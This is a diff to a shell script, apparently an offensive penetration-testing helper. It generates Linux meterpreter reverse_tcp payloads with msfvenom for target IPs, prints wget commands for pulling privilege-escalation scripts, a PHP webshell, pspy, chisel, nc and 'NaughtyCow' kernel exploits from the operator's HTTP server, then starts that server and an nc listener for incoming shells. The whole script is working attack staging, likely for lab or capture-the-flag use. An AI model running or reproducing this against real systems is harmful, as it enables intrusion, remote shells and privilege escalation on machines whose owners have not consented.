@@ -11,7 +11,7 @@ filename="file.txt"
 
 while read line
   do
-  msfvenom -p linux/x86/meterpreter/reverse_tcp  LHOST=$line LPORT=6666 -f exe -o linpayload.elf
+  msfvenom -p linux/x86/meterpreter/reverse_tcp  LHOST=$line LPORT=6666 -f exe -o ./ALL/linpayload.elf
 done < $filename
 
 # -------------------------------------------------------------------------------------
@@ -33,28 +33,21 @@ echo "\t\t                                                                      
 echo "\t\t                   BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)                      "
 echo "\n"
 
-echo "Startup Instructions:"
-echo "\n"
-echo "If required:"
-echo "wget \"http://$line:8000/linpayload.elf\"\n\nOtherwise:"
-
+echo "Startup Instructions:\n"
 while read line
   do
-  echo "wget \"http://$line:8000/SH/LinEnum.sh\""
-  echo "wget \"http://$line:8000/SH/LinEnumPlus.sh\""
-  echo "wget \"http://$line:8000/SH/LinPe.sh\""
-  echo "wget \"http://$line:8000/SH/LinPEAS.sh\""
-  echo "wget \"http://$line:8000/SH/coffee.sh\""
-  echo "wget \"http://$line:8000/PHP/webshell.php\""
-  echo "wget \"http://$line:8000/ELF/pspy32\""
-  echo "wget \"http://$line:8000/ELF/pspy64\""
-  
-  echo "\nKernel Exploits:"
-  echo "wget \"http://$line:8000/KERNALS/NaughtyCowCompile.sh\""
-  echo "wget \"http://$line:8000/KERNALS/NaughthyCow.c\""
+  echo "wget \"http://$line:8000/ALL/"
 done < $filename
 
-echo ""
+echo "\nENUMERATION			SHELLS				RUNNING PROCESSES		COMMUNICATIONS			KERNAL EXPLOITS		"
+echo "----------------------------------------------------------------------------------------------------------------------------------------------------------"
+echo "coffee.sh\"			linpayload.elf\"		\tpspy32\"			\tchisel\"			\tnaughtycowcompile.sh\""
+echo "linpeas.sh\"			webshell.php\"			pspy64\"			\tnc\"				naughycow.c\"		"
+echo "linenum.sh\"																		"
+echo "linenumplus.sh\"																		"
+echo "linpe.sh\"\n																		"
+echo "----------------------------------------------------------------------------------------------------------------------------------------------------------"
+
 exec python -m SimpleHTTPServer > output.txt &
 rlwrap nc -lvnp 9001
 
